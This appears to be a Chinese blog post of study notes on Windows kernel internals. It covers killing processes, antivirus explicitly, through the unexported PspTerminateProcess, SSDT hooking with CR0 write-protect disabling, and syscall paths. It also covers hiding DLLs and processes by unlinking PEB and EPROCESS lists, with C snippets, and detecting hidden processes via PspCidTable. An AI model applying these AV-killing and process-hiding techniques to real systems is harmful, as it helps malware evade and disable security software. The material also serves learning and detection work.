<p>参考链接：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272598.htm">EXP编写学习 之 绕过GS（四）</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/07/11/Cheese_point/%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/11/Cheese_point/%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">博客相关知识点整理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-11 00:00:00" itemprop="dateCreated datePublished" datetime="2022-07-11T00:00:00+08:00">2022-07-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-25 16:03:59" itemprop="dateModified" datetime="2022-07-25T16:03:59+08:00">2022-07-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">知识点补充学习</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>20 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="进程强杀"><a href="#进程强杀" class="headerlink" title="进程强杀"></a>进程强杀</h3><p>因为ring0的特权级别是比ring3高的，那么我们肯定不能在ring3调用windows提供的api杀死ring0特权级别的进程，那么这时候我们就需要使用ring0的函数来强行结束一些处于ring0级别的进程。</p>
<h4 id="ZwTerminateProcess"><a href="#ZwTerminateProcess" class="headerlink" title="ZwTerminateProcess"></a>ZwTerminateProcess</h4><p>该函数是一个Ring0函数，结构参数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS <span class="title">ZwTerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HANDLE   ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           NTSTATUS ExitStatus</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>但是这个函数在RIng0层面下，已经被杀软hook掉了，所以如果调用这个函数Kill杀软会被拒绝。</p>
<h4 id="PspTerminateProcess"><a href="#PspTerminateProcess" class="headerlink" title="PspTerminateProcess"></a>PspTerminateProcess</h4><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220711173115524.png" alt="image-20220711173115524"></p>
<p>这个函数是没有被导出的，要调用该函数有两种方法</p>
<blockquote>
<ol>
<li>暴力搜索，提取该函数的特征码，全盘搜索。</li>
<li>如果有已文档化的函数调用了PspTerminateProcess，那我们就可以通过指针加偏移的方式获取到他的地址，同样可以调用。</li>
</ol>
</blockquote>
<p>我们的驱动在被系统加载的同时，内存中会出现一个描述我们驱动信息的对象：<code>DRIVER OBJECT</code>，而这个对象的地址，其实就保存在我们驱动的入口函数 <code>Driver Entry </code>的第1个参数中。</p>
<p>在 <code>DriverObject </code>对象中，有一个 <code>Driver Section</code> 成员，它所指向的是一个名叫 <code>_LDR_DATA_TABLE_ENTRY </code>的结构体，该结构体每个驱动模块都有一份，在这个结构体中就保存着一个驱动模块的所有信息。</p>
<p>系统中有一个双向链表，其中每一个节点都保存着一个驱动模块的所有信息，而 <code>InLoadOrderLinks</code> 就是该链表中的节点类型，<code>Flink </code>指向下一个驱动对象的 <code>_LDR_DATA_TABLE_ENTRY</code>，<code>Blink</code> 指向上一个驱动对象的 <code>_LDR_DATA_TABLE_ENTRY</code>。</p>
<p>因此，我们只要遍历这个<code> InLoadOrderLinks</code> ，就能获取系统中所有驱动的模块信息。</p>
<p>接下来就是特征码的搜索匹配，在上图中可以看到，前一部分压栈操作不能作为特征码，所以可以选取中间部分，知道后再减去相应偏移。</p>
<p>遍历代码如下：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712103431244.png" alt="image-20220712103431244"></p>
<p>结束进程代码：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712103453477.png" alt="image-20220712103453477"></p>
<p>特征码查找：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712103646640.png" alt="image-20220712103646640"></p>
<p>上图中最后减去5是特征匹配字段与函数开头的距离（示例代码是在x86位下）</p>
<p>1.将程序编译成sys文件后安装驱动，即可关闭进程；</p>
<p>2.可以利用ring3常规方式传输数据到ring0的方式结束进程（其实就是多写一个客户端程序与驱动通信）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712114148635.png" alt="image-20220712114148635"></p>
<p>请注意第一个红框，这是老写法，查阅资料如下</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712114301237.png" alt="image-20220712114301237"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总结一下，这篇进程强杀，主要用到了<code>PspTerminateProcess</code>函数，该函数并未导出，采取的是<code>DRIVER_OBJECT</code>的<code>Driver Section</code>成员，它所指向的是一个名叫 <code>_LDR_DATA_TABLE_ENTRY </code>的结构体，该结构体大家都比较熟悉，通过遍历其中的 <code>InLoadOrderLinks</code> 加上匹配特征码的方式就能得到函数地址。</p>
<h3 id="Ring0下的进程保护"><a href="#Ring0下的进程保护" class="headerlink" title="Ring0下的进程保护"></a>Ring0下的进程保护</h3><h4 id="SSDT表"><a href="#SSDT表" class="headerlink" title="SSDT表"></a>SSDT表</h4><p>主要用到SSDT HOOK，SSDT表并不仅仅只包含一个庞大的地址索引表，它还包含着一些其它有用的信息，诸如地址索引的基地址、服务函数个数等。通过修改此表的函数地址可以对常用 Windows 函数及 API 进行 Hook，从而实现对一些关心的系统动作进行过滤、监控的目的。一些 HIPS、防毒软件、系统监控、注册表监控软件往往会采用此接口来实现自己的监控模块。</p>
<p>因为x64位中ssdt表是加密的，ssdt中的每一项占4个字节但并不是对应的系统服务的地址，因为x64中地址为64位，而ssdt每一项只有4个字节所以无法直接存放服务的地址。其实际存储的4个字节的前28位表示的是对应的系统服务相对于SSDT表基地址的偏移，而后4位如果对应的服务的参数个数小于4则其值为0，不小于4则为参数个数减去4。</p>
<p>所以我们在ssdt hook时向ssdt表项中填入的函数得在ntoskrnl.exe模块中，原因是因为函数到SSDT表基地址的偏移大小小于4个字节。所以我们需要选取一个ntoskrnl.exe中很少使用的函数<code>KeBugCheckEx</code>作为中转函数，将需要hook的ssdt项的改为<code>KeBugCheckEx</code>函数，然后在<strong>Inlinehook KeBugCheck</strong>函数，jmp到我们的函数中进行过滤。</p>
<p><code>KeServiceDescriptorTable</code> 和 <code>KeServiceDescriptorTableShadow</code>，其中 <code>KeServiceDescriptorTable</code> 主要是处理来自 Ring3 层 <code>Kernel32.dll</code> 中的系统调用，而 <code>KeServiceDescriptorTableShadow</code> 则主要处理来自 <code>User32.dll</code> 和 <code>GDI32.dll</code> 中的系统调用，并且<code>KeServiceDescriptorTable</code> 在<code>ntoskrnl.exe</code>(Windows 操作系统内核文件，包括内核和执行体层)是导出的，而 <code>KeServiceDescriptorTableShadow</code> 则是没有被 Windows 操作系统所导出。</p>
<p>通过SSDT表中<code>OpenProcess</code>函数的索引（系统调用号）来找到该函数。或者利用<code>Terminateprocess</code>函数也是可以的。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712162202878.png" alt="image-20220712162202878"></p>
<h4 id="CR0寄存器"><a href="#CR0寄存器" class="headerlink" title="CR0寄存器"></a>CR0寄存器</h4><p>修改内存页属性，SSDT表所在的内存页属性是只读，没有写入的权限，所以需要把该地址设置为可写入，这样才能写入自己的函数，使用的是CR0寄存器关闭只读属性。</p>
<h4 id="获取SSDT表基址"><a href="#获取SSDT表基址" class="headerlink" title="获取SSDT表基址"></a>获取SSDT表基址</h4><p>在x86下，可以通过代码的方式直接读取 <code>KeServiceDescriptorTable</code> 这个被导出的表结构从而可以直接读取到SSDT表的基址，而在Win64系统中 <code>KeServiceDescriptorTable</code> 这个表并没有被导出，所以我们必须手动搜索到它的地址。</p>
<p>1.这里我们可以通过MSR(特别模块寄存器)，读取C0000082寄存器，从而得到<code>KiSystemCall64</code>的地址，在内核调试模式下直接输入<code> rdmsr c0000082</code> 即可读取到该地址，反汇编可看到<code> nt!KiSystemCall64Shadow</code> 函数。（<strong>Win10中如果开启了KVA Shadow那么这个地址是nt!KiSystemCall64Shadow，否则是nt!KiSystemCall64。</strong>）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712161035727.png" alt="image-20220712161035727"></p>
<p>在<code>KiSystemCall64Shadow</code>函数的最后，有一个jmp指令，会跳转到<code>nt!KiSystemServiceUser</code>函数。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712161456407.png" alt="image-20220712161456407"></p>
<p>继续跟进<code>KiSystemServiceUser</code>函数，可以看到对<code>nt!KeServiceDescriptorTable</code>的读取。<code>KeServiceDescriptorTable</code>就是SSDT表。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712161541476.png" alt="image-20220712161541476"></p>
<p>总结一下，获取SSDT基址流程：</p>
<p><strong>MSR寄存器（0xC0000082）-&gt; nt!KiSystemCall64Shadow -&gt;nt!KiSystemServiceUser -&gt; nt!KeServiceDescriptorTable。具体查找也是通过字节码匹配。</strong></p>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>下面是InlineHook KeBugCheckEx()的部分</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712163341384.png" alt="image-20220712163341384"></p>
<p>关键匹配部分</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712164037294.png" alt="image-20220712164037294"></p>
<p>获取函数部分</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712164429035.png" alt="image-20220712164429035"></p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>这篇主题是进程保护，实际上主要知识点是关于<strong>SSDT_HOOK</strong>，需要注意的是x86和x64下操作方式不同，现在网上很多的x64下的也是基于win7的，并且x64下需要绕过PG。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41490873/article/details/108251175">x64下的进程保护</a>，<a target="_blank" rel="noopener" href="https://www.freesion.com/article/2812320367/">x64下的SSDTHOOK</a></p>
<h3 id="Ring3下API的逆向分析及重构"><a href="#Ring3下API的逆向分析及重构" class="headerlink" title="Ring3下API的逆向分析及重构"></a>Ring3下API的逆向分析及重构</h3><p>首先分析<code>ReadProcessMemory</code>函数整个调用过程，我们知道函数虽然是Kernel32.dll中的函数，但是只不过是封装好的函数，最终调用还是会到ntdll.dll中去。</p>
<p>我们先随便写个程序，然后生成64位exe动态分析。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712192755554.png" alt="image-20220712192755554"></p>
<p><code>ReadProcessMemory</code>实际上会调用红框中的函数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712192744224.png" alt="image-20220712192744224"></p>
<p><code>NtReadVirtualMemory</code>函数如下图，test执行与操作，结果为0，ZF被置位，所以不执行下面的跳转（<strong>注意与cmp指令的差别</strong>）</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712193240271.png" alt="image-20220712193240271"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712193728459.png" alt="image-20220712193728459"></p>
<p>这个地方首先是将内核函数的编号给了eax，然后test命令比较判断是采取中断的方式还是syscall的方式进入0环（以前x86的方式是调用<code>KiFastSystemCall</code>函数,也就是<code>0x7ffe0300</code>这个地址，该函数决定了采取哪种方式进入0环）。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712194929243.png" alt="image-20220712194929243"></p>
<h4 id="KUSER-SHARED-DATA"><a href="#KUSER-SHARED-DATA" class="headerlink" title="_KUSER_SHARED_DATA"></a>_KUSER_SHARED_DATA</h4><p>前面说到了<code>0x7ffe0308</code>这个地址，如下图，其实就是shareddata+0x308</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712195644152.png" alt="image-20220712195644152"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220712195706609.png" alt="image-20220712195706609"></p>
<p>在 User 层和 Kernel 层分别定义了一个 <code>_KUSER_SHARED_DATA</code>结构区域，用于 User 层和 Kernel 层共享某些数据，它们使用固定的地址值映射，<code>_KUSER_SHARED_DATA</code> 结构区域在 User 和 Kernel 层地址分别为：</p>
<blockquote>
<p>User 层地址为：0x7ffe0000</p>
<p>Kernel 层地址为：0xffdf0000</p>
</blockquote>
<p>虽然指向的是同一个物理页，但在ring3层是只读的，在ring0层是可写的，在0x308偏移处<code>SystemCall</code>存放的地址就是真正进入ring0的实现方法。</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这篇API逆向，主要涉及到了3环进入0环的详细结构，关于重构其实网上示例代码是有关call KiFastSystemCall的，但是x64并没有调用这个函数，而是直接进行了判断然后选取以哪种方式进入0环。</p>
<h3 id="基于PEB断链实现隐藏"><a href="#基于PEB断链实现隐藏" class="headerlink" title="基于PEB断链实现隐藏"></a>基于PEB断链实现隐藏</h3><h4 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h4><p>前面提到的关于<code>DRIVER_OBJECT</code>结构中的<code>Driver Section</code>成员，实际上是一个结构体</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714113338981.png" alt="image-20220714113338981"></p>
<p>偏移处有一个<code>DllBase</code>，这里存放的就是dll的地址，所以这里我们如果要想隐藏某个指定的dll，就可以通过<code>DllBase</code>的方式，通过<code>GetModuleHandleA</code>获取dll的句柄，来进行比对。</p>
<p>前面三个双向链表结构都是一样的，我们以InloadOrderModuleList来进行断链示范（其他两个一样的操作），要实现断链，最简单的做法就是让Head的Flink和Blink指向它自己。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PPEB_LDR_DATA ldr;  </span><br><span class="line">PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line">PLIST_ENTRY Head, Cur; </span><br><span class="line">Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		ldte = CONTAINING_RECORD( Cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span><br><span class="line">		<span class="keyword">if</span> (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">		&#123;		</span><br><span class="line">			</span><br><span class="line">			ldte-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldte-&gt;InLoadOrderModuleList.Flink;  </span><br><span class="line">			ldte-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldte-&gt;InLoadOrderModuleList.Blink;		 </span><br><span class="line">		&#125;</span><br><span class="line">		Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; <span class="keyword">while</span>(Head != Cur);</span><br></pre></td></tr></table></figure>

<h4 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h4><p>在windows系统中，所有的活动进程都是连在一起的，构成一个双链表，表头是全局变量<code>PsActiveProcessHead</code>，当一个进程被创建时，其<code>ActiveProcessList</code>域将被作为节点加入到此链表中；当进程被删除时，则从此链表中移除，如果windows需要枚举所有的进程，直接操纵此链表即可。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714150402209.png" alt="image-20220714150402209"></p>
<p>前八个字节指向的是下一个<code>EPROCESS</code>的偏移0x448处</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714151607623.png" alt="image-20220714151607623"></p>
<p>如下图，可以看到进程名为<code>system</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714151816955.png" alt="image-20220714151816955"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714151851947.png" alt="image-20220714151851947"></p>
<p>我们继续看下一个，可以看到进程名<code>Registry</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714152047989.png" alt="image-20220714152047989"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714152033134.png" alt="image-20220714152033134"></p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>在驱动中通过 <code>PsGetCurrentProcess()</code>，来获取当前进程的<code>EPROCESS</code>结构体，然后通过链表遍历其余的<code>EPROCESS</code>,可以通过比较<code>ImageFileName</code>字段来筛选自己想要隐藏的进程。然后对其进行断链操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curNode = (PLIST_ENTRY)((ULONG)pCurProcess + <span class="number">0x448</span>);</span><br><span class="line">nextNode = curNode-&gt;Flink;</span><br><span class="line">preNode = curNode-&gt;Blink;</span><br><span class="line"></span><br><span class="line">preNode-&gt;Flink = curNode-&gt;Flink;</span><br><span class="line"></span><br><span class="line">nextNode-&gt;Blink = curNode-&gt;Blink;</span><br></pre></td></tr></table></figure>

<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>这样的隐藏技术主要是基于关键结构体的成员，来进行摸链操作，可以详细复习一下EPROCESS、ETHREAD等关键数据结构</p>
<h3 id="全局句柄表发现隐藏进程"><a href="#全局句柄表发现隐藏进程" class="headerlink" title="全局句柄表发现隐藏进程"></a>全局句柄表发现隐藏进程</h3><p>前面说了0环进行PEB断链可以达到隐藏进程的效果，但是这只是作为权限维持的一种方法。所以这篇讲了基于全局句柄表<code>PsdCidTable</code>，来找到隐藏进程的效果。</p>
<p>在EPROCESS中有一个成员<code>ObjectTable</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714163125878.png" alt="image-20220714163125878"></p>
<p><code>TableCode</code>就是句柄表地址</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714163148316.png" alt="image-20220714163148316"></p>
<p>句柄表结构如下，句柄表以分级的方式存储，最多三级</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714173229625.png" alt="image-20220714173229625"></p>
<p>句柄共八个字节,64位</p>
<ul>
<li>（bit48~bit63）这一块共计两个字节，16位；高位字节是给SetHandleInformation这个函数用的，例如当执行如下语句：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandleInformation(Handle,HANDLE_FLAG_PROTECT_FROM_CLOSE,HANDLE_FLAG_PROTECT_FROM_CLOSE);</span><br></pre></td></tr></table></figure>

<p>这个位置将会被写入0x02</p>
<ul>
<li>（bit32~bit47）这一块也是两个字节，16位；这块是访问掩码，是给<code>OpenProcess</code>这个函数用的，即<code>OpenProcess</code>的第一个参数 <code>dwDesiredAccess</code>的值</li>
<li>（bit0~bit31）这两块共计四个字节，32位，各个位主要含义如下：<ul>
<li>bit0：OBJ_PROTECT_CLOSE，表示调用者是否允许关闭该句柄；默认值为1</li>
<li>bit1：OBJ_INHERIT，指示该进程创建的子进程<strong>是否可以继承该句柄</strong>，即是否将该句柄项拷贝到它们的 句柄表中</li>
<li>bit2：OBJ_AUDIT_OBJECT_CLOSE，指示关闭该对象时是否产生一个审计事件；默认值为0</li>
<li>bit3~31：存放<strong>该内核对象在内核中的具体地址</strong></li>
</ul>
</li>
</ul>
<p><strong>句柄表中存放的是指针，32位就是32位指针</strong></p>
<p>x64 算法:<br>进程ID(句柄索引) / 4 = 表索引<br>表索引 * 16 = 全局句柄表条目</p>
<p>x86算法：</p>
<p>进程ID / 4 = 表索引<br>表索引 * 8 = 全局句柄表条目</p>
<blockquote>
<p>为什么 * 8 (16)因为每一项占8(16)字节，<strong>前4(8)字节为头，后4(8)字节为地址</strong></p>
</blockquote>
<h4 id="OBJECT-HEADER"><a href="#OBJECT-HEADER" class="headerlink" title="_OBJECT_HEADER"></a>_OBJECT_HEADER</h4><p>当一个进程创建或者打开一个<strong>内核对象</strong>时，将获得一个<strong>句柄</strong>，通过这个句柄可以访问对应的内核对象。上面知道可以从句柄低32位获取到内核对象的地址，<strong>内核对象在开头都有一个0x30字节的_OBJECT_HEADER结构</strong>，这是内核对象的头部，也就是说从0x30字节开始， 才是进程结构体开始的位置。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714165444894.png" alt="image-20220714165444894"></p>
<h4 id="全局句柄表"><a href="#全局句柄表" class="headerlink" title="全局句柄表"></a>全局句柄表</h4><p>全局变量 <code>PspCidTable </code>存储了全局句柄表 <code>_HANDLE_TABLE </code>的地址，全局句柄表存储了所有 <code>EPROCESS </code>和 <code>ETHREAD</code> ，全局句柄表项<strong>低32位指向的就是内核对象，而非 <code>OBJECT_HEADER</code>。</strong></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714193904141.png" alt="image-20220714193904141"></p>
<p><code>TableCode</code>最后一位为1，代表句柄表中有两层，当最后一位为0时，代表直接指向句柄表，当最后一位为1时代表指向一个数组，数组中的值才指向的是句柄，这个数组可以存放句柄表的指针，为2时就变成了一个三维数组</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714194647467.png" alt="image-20220714194647467"></p>
<p><strong>X86下_HANDLE_TABLE_ENTRY结构大小为8，x64下结构大小为16，每张表4k大小4k/16=256，所以一张表可以存256个handle。二级三级表存放指针，x64下一个指针地址占用8字节，x86下占用4字节。4k/8=512</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*为0时*/</span></span><br><span class="line"></span><br><span class="line">Handle Handle_table[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*为1时*/</span></span><br><span class="line"></span><br><span class="line">Handle_table Handle_table[<span class="number">512</span>][<span class="number">0</span>] = Handle_table;</span><br></pre></td></tr></table></figure>

<p>根据上面的分析我们知道，当前句柄表存储的是512个句柄表数组(大小为0x8)的数组指针,每个句柄表数组有256个成员，每个成员大小为0x10大小, 这里我们查询的目标明显在第一张句柄表中,我们查看目标内存。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714201137389.png" alt="image-20220714201137389"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714201250273.png" alt="image-20220714201250273"></p>
<p>这里我们查看PID为4的进程对象，先4/4 = 1（0x01）计算地址公式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffffad09`de6b0000 + <span class="number">0x01</span> * <span class="number">16</span> = ffffad09`de6b0010</span><br></pre></td></tr></table></figure>

<p>**(note:前面提到过PspCidTable表中其表项低32位指向目标的Object，内核句柄表中存储的是Object_Header。)**所以：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(c40ae409`<span class="number">80401</span>dc5 &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span> == ffffc40ae4098040</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714203006143.png" alt="image-20220714203006143"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714203021436.png" alt="image-20220714203021436"></p>
<p>我们成功在全局句柄表中查了目标进程对象，这里我们可以看其对应的<code>Object_Header</code>。圈起来的地方就是64与32的区别，64位<code>Object_Header</code>中已经没有<code>Object_Type</code>结构体指针，取而代之的是<code>TypeIndex</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714203256351.png" alt="image-20220714203256351"></p>
<p>其是一个XOR加密的数据,我们可以逆向解出其数据，公式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x2 ^ 0x80(上图中OBJECT_HEADER地址的倒数第二字节) ^ ObHeaderCookie</span><br></pre></td></tr></table></figure>

<p>其中 ObHeaderCookie 为一个BYTE字节的全局变量，我么可以通过WinDbg查看</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714203628443.png" alt="image-20220714203628443"></p>
<p>计算结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x2 ^ 0x80 ^ ObHeaderCookie(0x85) == 0x7</span><br></pre></td></tr></table></figure>

<p>这里的0x7对应的是<code>Object_Type</code>中的<code>Index</code>字段(外提一句线程是0x8)，我们查看<code>PsProcessType</code>(其为<code>Object_Type</code>结构)</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714203852783.png" alt="image-20220714203852783"></p>
<p><strong>第二种方法：</strong></p>
<p><code>TypeIndex</code>就在说明内核对象的类型，说明放在了<code>ObTypeIndexTable</code>中，将<code>ObTypeIndexTable</code>首地址：<code>fffff807670fce80</code>,取出来然后+0x2* 8(x86为0x2 * 4):</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714204313626.png" alt="image-20220714204313626"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714204329658.png" alt="image-20220714204329658"></p>
<p>然后使用<code>_OBJECT_TYPE</code>查看是什么类型(<strong>也不知道为啥我这里是Type,大家也可以试试hhh</strong>)：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714204746773.png" alt="image-20220714204746773"></p>
<p><strong>第三种方法</strong>：既然<code>Object_Header</code>中去除了<code>Object_Type</code>, 那么我们如何快速获取Object对应的<code>Object_Type</code>呢，这里我们可以利用内核导出函数<code>ObGetObjectType</code>，来获取对象对应的<code>OBJECT_TYPE</code>, 函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回_OBJECT_TYPE指针</span></span><br><span class="line"><span class="function">NTKERNELAPI PVOID NTAPI <span class="title">ObGetObjectType</span><span class="params">(IN PVOID pObject<span class="comment">/*目标对象结构体指针*/</span>)</span></span>;</span><br></pre></td></tr></table></figure>

